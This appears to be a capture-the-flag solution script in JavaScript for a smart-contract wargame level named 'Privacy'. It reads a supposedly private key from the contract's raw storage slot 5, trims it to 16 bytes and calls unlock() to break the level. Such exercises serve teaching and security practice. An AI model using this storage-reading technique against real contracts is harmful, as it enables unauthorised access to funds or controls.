const {
    PRIVACY_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink
} = require('./utils');

async function main(levelName = 'Privacy') {
    logStartingLevel(levelName);

    if (!PRIVACY_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, PRIVACY_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("Privacy");
    const contract = factory.attach(PRIVACY_INSTANCE_ADDRESS);
    const key32 = await ethers.provider.getStorageAt(contract.address, 5);
    const key16 = key32.slice(0, 16 * 2 + 2); // 16 bytes * 2 char + 2 char (0x)

    const tx = await contract.unlock(key16);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;
